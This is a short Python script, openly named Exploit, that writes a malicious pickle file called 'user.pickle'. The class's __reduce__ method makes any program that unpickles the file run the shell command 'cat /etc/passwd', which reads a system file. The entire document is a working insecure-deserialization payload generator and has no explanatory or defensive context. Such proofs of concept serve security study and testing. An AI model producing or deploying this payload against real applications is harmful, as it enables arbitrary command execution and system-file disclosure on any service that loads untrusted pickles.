import pickle


class Exploit(object):
    def __reduce__(self):
        import os
        return os.system, ("cat /etc/passwd", )


def create_payload():
    pickle_file = "user.pickle"
    payload = Exploit()
    with open(pickle_file, "wb") as file:
        pickle.dump(payload, file)


if __name__ == '__main__':
    create_payload()
